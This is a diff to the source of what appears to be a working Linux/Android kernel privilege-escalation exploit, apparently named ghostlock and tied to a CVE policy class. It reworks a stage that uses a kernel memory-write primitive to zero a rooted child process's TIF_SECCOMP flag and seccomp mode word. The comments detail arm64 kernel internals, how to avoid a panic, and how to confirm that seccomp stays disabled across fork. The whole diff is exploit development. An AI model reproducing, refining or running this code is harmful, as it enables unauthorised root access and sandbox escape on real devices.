@@ -237,13 +237,34 @@ namespace ghostlock::session::backend {
             return VictimRound::Rooted;
         }
 
-        /* Attempt the seccomp clear with a masked TIF_SECCOMP write and
-         * mode=0/filter_count=1. The raw write is 8 bytes; a zero store
-         * clears every TIF_* flag and the filter reference count, which
-         * panics. The mask/value form avoids the panic, but the route's value
-         * write only applies 0/valid kernel pointers, so the child stays
-         * Seccomp: 2 on this kernel (verified). The final profile sets
-         * w3_attempts=0 and uses Shizuku. */
+        /* W3: put the rooted child into a real SECCOMP_MODE_DISABLED state using
+         * the only word value the write primitive can store: zero.
+         *
+         * Kernel facts this depends on (v6.6 arm64, read from source):
+         *  - a syscall runs seccomp only while TIF_SECCOMP (bit 11 of
+         *    thread_info.flags, task+0x00) is set: arch/arm64/kernel/
+         *    entry-common.c and kernel/entry/common.c gate on that flag, and
+         *    include/linux/thread_info.h maps set_task_syscall_work(SECCOMP)
+         *    onto TIF_SECCOMP because arm64 6.6 has no syscall_work word;
+         *  - kernel/seccomp.c __secure_computing() has no SECCOMP_MODE_DISABLED
+         *    case (`default: BUG()`), so zeroing seccomp.mode while the flag is
+         *    still set panics the kernel on the next syscall - that, not the
+         *    filter reference count, was the old "mode-only" panic;
+         *  - kernel/fork.c copy_seccomp() re-arms TIF_SECCOMP in every child
+         *    while seccomp.mode != DISABLED, so clearing the flag alone still
+         *    leaves `sh -> ksud` filtered;
+         *  - kernel/exit.c release_task() releases seccomp.filter regardless of
+         *    mode, so mode=DISABLED with the filter pointer still set is
+         *    consistent: no leak and no free_task() WARN.
+         *
+         * The clear is therefore two whole-word zero stores - thread_info.flags,
+         * then the {mode, filter_count} word - performed while the child is
+         * parked in a group stop. Zero is exactly the leaf arm of the primitive
+         * (WriteMode::Zero with leaf=1), the same store the comm probe has
+         * already proved on this very task. Masked or mode=0/filter_count=1
+         * words are outside the primitive's value space (the walk consumes the
+         * value as an rb parent pointer), which is why the previous W3 returned
+         * success and changed nothing. */
         template <class M>
         bool w3(ExploitSession &session, VictimChain &chain,
                 victim::w2_stage_context &w2_context,
@@ -252,13 +273,12 @@ namespace ghostlock::session::backend {
             int32_t &child_alive = chain.child_alive;
             int32_t &seccomp_ok = chain.seccomp_ok;
 
-            /* W3: attempt the masked TIF_SECCOMP + mode/filter_count write.
-         * The route returns success but only applies 0/valid pointers, so the
-         * child stays Seccomp: 2 (verified). tcp stamps *(target) exactly; the
-         * pselect fallback needs the comm probe to tell [target] from
-         * [target+8]. The final profile skips this path (w3_attempts=0). */
+            /* The shell/Shizuku flow runs without an app filter (Seccomp: 0) and
+             * fork() inherits that, so its child needs no W3. tcp stamps
+             * *(target) exactly; the pselect fallback needs the comm probe to
+             * tell [target] from [target+8]. */
             if (!attack::process_has_seccomp()) {
-                pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
+                pr_success("no app seccomp filter (shell flow); skipping W3\n");
                 seccomp_ok = 1;
                 return true;
             }
@@ -286,86 +306,80 @@ namespace ghostlock::session::backend {
                 support::run_state::complete("w3a");
             }
 
-            uintptr_t flags_target = w3_context.leaf_to_target8
-                                         ? child_task - 8
-                                         : child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF;
-            uintptr_t mode_target = w3_context.leaf_to_target8
-                                        ? child_task + ghostlock::profile::task_seccomp_off() - 8
-                                        : child_task + ghostlock::profile::task_seccomp_off();
+            const uintptr_t flags_target = w3_context.leaf_to_target8
+                                               ? child_task - 8
+                                               : child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF;
+            const uintptr_t mode_target = w3_context.leaf_to_target8
+                                              ? child_task + ghostlock::profile::task_seccomp_off() - 8
+                                              : child_task + ghostlock::profile::task_seccomp_off();
 
-            uint32_t w3_attempts = g_exploit_session.profile.w3_attempts();
-            /* Fast refusal. Every W3 request uses WriteMode::SeccompFlags or
-             * SeccompMode, which payload_write_layout() rejects because the
-             * value primitive stores only 0 or a valid kernel pointer. Without
-             * this guard the request would be refused deeper in
-             * prepare_kernel_page() and burn the whole heap-prepare timeout
-             * (240 s by default) before failing. Run-state steps are left
-             * not_start so the record cannot imply W3 ever began. */
-            if (w3_attempts > 0) {
-                pr_warning("W3 disarmed: this build's write primitive cannot express "
-                           "TIF_SECCOMP or the seccomp mode/filter_count word. "
-                           "Set w3_attempts=0 and use the adb/shell flow "
-                           "(docs/W3-SECCOMP-ANALYSIS.md).\n");
+            /* One zero store. Until the child runs again there is no
+             * userspace-visible state to verify against, so an attempt either
+             * reports a landed relink or is simply re-run. */
+            const uint32_t write_attempts = g_exploit_session.profile.w3_attempts();
+            const auto zero_word = [&](uintptr_t target, const char *stage) {
+                const memory::WriteRequest request =
+                        memory::WriteRequest::make(target, memory::WriteMode::Zero, 1);
+                for (uint32_t attempt = 1; attempt <= write_attempts; attempt++) {
+                    pr_info("%s attempt %u/%u\n", stage, attempt, write_attempts);
+                    if (attempt == 1) attack::slab_drain();
+                    if (Cve2026_43499Policy::template attack_write<M>(session, request, stage))
+                        return true;
+                    usleep(100000);
+                }
                 return false;
-            }
-            for (uint32_t attempt = 1; attempt <= w3_attempts; attempt++) {
-                pr_info("W3: TIF_SECCOMP mask + mode attempt %u/%u\n", attempt, w3_attempts);
-                if (attempt == 1) attack::slab_drain();
-                support::run_state::enter("w3b");
-                const memory::WriteRequest flags_request =
-                        memory::WriteRequest::make(flags_target, memory::WriteMode::SeccompFlags, 0);
-                Status routed = Cve2026_43499Policy::template attack_write<M>(session, flags_request, "W3: TIF_SECCOMP");
-                if (!routed) {
-                    /* Expected: the value primitive cannot express a TIF mask, so
-                     * the layout is rejected before any kernel write. Record the
-                     * failure instead of leaving w3b in_progress (which reads as a
-                     * panic) or claiming success. */
-                    support::run_state::fail("w3b");
-                    pr_warning("W3: TIF_SECCOMP write unsupported by the value primitive; "
-                               "aborting W3 (use the adb/shell flow)\n");
-                    break;
-                }
-                usleep(g_exploit_session.profile.w3_settle_us());
-                support::run_state::enter("w3c");
-                const memory::WriteRequest mode_request =
-                        memory::WriteRequest::make(mode_target, memory::WriteMode::SeccompMode, 0);
-                routed = Cve2026_43499Policy::template attack_write<M>(session, mode_request, "W3: seccomp mode");
-                if (!routed) {
-                    support::run_state::fail("w3c");
-                    support::run_state::fail("w3b");
-                    pr_warning("W3: seccomp mode/filter_count write unsupported by the value "
-                               "primitive; aborting W3 (use the adb/shell flow)\n");
-                    break;
-                }
-                usleep(g_exploit_session.profile.w3_settle_us());
-                int32_t st = 0;
-                if (waitpid(pipes.child(), &st, WNOHANG) == pipes.child()) {
-                    pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
-                    pipes.mark_child_exited();
-                    child_alive = 0;
-                    support::run_state::fail("w3b");
-                    support::run_state::fail("w3c");
-                    break;
-                }
-                /* Only a verified probe counts as a completed step. A route
-                 * returning success only means the write was attempted. */
-                if (victim::verify_seccomp_probe_stage(&w2_context)) {
-                    support::run_state::complete("w3b");
-                    support::run_state::complete("w3c");
-                    seccomp_ok = 1;
-                    break;
-                }
+            };
+
+            /* Park the child for the whole window: mode=DISABLED with the flag
+             * still set is a BUG, and a fork would re-arm the flag. */
+            support::run_state::enter("w3b");
+            if (!victim::stop_child(pipes)) {
                 support::run_state::fail("w3b");
-                support::run_state::fail("w3c");
-                pr_warning("W3 attempt %u did not change the child's seccomp state\n", attempt);
-                usleep(g_exploit_session.profile.w3_settle_us());
-            }
-
-            if (!seccomp_ok) {
-                pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
+                if (pipes.child() <= 0) child_alive = 0;
+                pr_warning("W3 could not park the rooted child\n");
                 return false;
             }
-            pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
+            /* Stop at the first failed store: a partial state is only safe while
+             * mode stays FILTER, so never zero mode after a missed flag write. */
+            bool cleared = zero_word(flags_target, "W3: TIF_SECCOMP clear");
+            if (cleared) cleared = zero_word(mode_target, "W3: seccomp mode clear");
+            /* Insurance: the flag word is the store that keeps every partial
+             * state safe, so give it a second, independent landing while the
+             * child is still parked. */
+            if (cleared) cleared = zero_word(flags_target, "W3: TIF_SECCOMP re-clear");
+            /* `completed` means the stores were issued and every route reported a
+             * landed relink; it is not the bypass verdict. A route that refuses
+             * the request must never look like success (the pre-fix W3 recorded
+             * `completed` for writes the primitive rejected). */
+            if (cleared) {
+                support::run_state::complete("w3b");
+            } else {
+                support::run_state::fail("w3b");
+            }
+            usleep(g_exploit_session.profile.w3_settle_us());
+
+            support::run_state::enter("w3c");
+            const int32_t mode = victim::continue_and_report_seccomp(pipes);
+            pr_info("W3: child reports Seccomp: %d\n", mode);
+            if (mode != 0) {
+                support::run_state::fail("w3c");
+                pr_warning("W3 seccomp clear failed (mode=%d writes=%d); ksud "
+                           "late-load will stay blocked\n", mode, cleared ? 1 : 0);
+                return false;
+            }
+            /* The fork probe is the verdict: it passes only when copy_seccomp()
+             * stops re-arming TIF_SECCOMP, which is the property ksud needs one
+             * process further down the chain. */
+            if (!victim::verify_fork_seccomp_stage(&w2_context)) {
+                support::run_state::fail("w3c");
+                pr_warning("W3: mode is disabled but a forked child is re-armed\n");
+                return false;
+            }
+            /* Informational: the errno cannot separate filtered from unfiltered. */
+            victim::probe_finit_module_stage(&w2_context);
+            support::run_state::complete("w3c");
+            seccomp_ok = 1;
+            pr_success("child seccomp disabled (mode=0); descendants run filter-free\n");
             return true;
         }
 
